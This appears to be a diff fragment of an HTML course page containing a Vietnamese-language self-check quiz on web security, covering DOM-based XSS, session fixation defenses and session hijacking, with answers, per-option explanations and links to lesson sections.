+    why: ["Payload không được lưu ở đâu cả; nó nằm trong link.", "Server không nhận fragment nên không thể phản chiếu nó vào HTML.", "Fragment chỉ tồn tại trong trình duyệt; chính JS của trang đưa nó vào DOM, nên WAF không thấy và phải sửa ở client.", "XSS xác định bởi việc script chạy trong origin của app, không phụ thuộc server có nhận payload hay không."],
+    explain: "Stored: nằm trong DB. Reflected: dội lại qua server. DOM: JS phía client tự gây ra. Xem bảng so sánh ở <a href='m06-3-web-threats.html#xss'>C.2</a>." },
+  { q: "Biện pháp nào giúp chống <b>session fixation</b>? (chọn nhiều)",
+    options: ["Cấp session ID mới ngay sau khi đăng nhập và khi tăng đặc quyền", "Không chấp nhận session ID truyền qua URL", "Dùng tiền tố cookie <code>__Host-</code>", "Tăng độ dài session ID từ 128 lên 256 bit"],
+    answer: [0, 1, 2],
+    why: ["ID kẻ gian cài sẵn bị bỏ đi sau login, nên thứ hắn đang giữ trở nên vô giá trị.", "Chặn cách cài ID phổ biến nhất: link có chứa session ID.", "<code>__Host-</code> buộc cookie có Secure, Path=/ và không có Domain, nên subdomain bị chiếm không ghi đè được.", "Kẻ gian không cần đoán ID — chính hắn tạo ra nó; độ dài chỉ chống dò, không chống fixation."],
+    explain: "Lớp chặn cốt lõi là đổi ID sau login. Xem <a href='m06-3-web-threats.html#session-fixation'>C.3</a>." },
+  { q: "App đã cấp session ID mới sau login. Tuy vậy, một lỗi XSS đọc <code>document.cookie</code>, lấy được session ID của An (sau khi An đã đăng nhập) và kẻ gian dùng nó từ máy khác. Đây là tấn công gì và lớp phòng vệ nào còn thiếu?",
+    options: ["Session fixation — thiếu bước đổi ID sau login", "Session hijacking — cookie thiếu <code>HttpOnly</code> (và có lỗi XSS)", "CSRF — thiếu anti-CSRF token", "Account enumeration — thông báo lỗi khác nhau"],
+    answer: 1,
+    why: ["App đã đổi ID; kẻ gian lấy ID <b>sau</b> login chứ không cài trước.", "Lấy trộm ID đang dùng sau login là hijacking; có HttpOnly thì <code>document.cookie</code> không thấy cookie đó.", "CSRF không đọc được cookie và không mang session sang máy khác.", "Enumeration là dò tài khoản nào tồn tại, không liên quan tới cookie."],
+    explain: "Fixation: cài trước rồi chờ. Hijacking: giật sau khi login. Xem bảng so sánh ở <a href='m06-3-web-threats.html#session-fixation'>C.3</a>." }
+];
+</script>
+<script src="https://cdn.jsdelivr.net/npm/mermaid@10.9.1/dist/mermaid.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="assets/pages.js"></script>
+<script src="assets/app.js"></script>
+</body>
+</html>
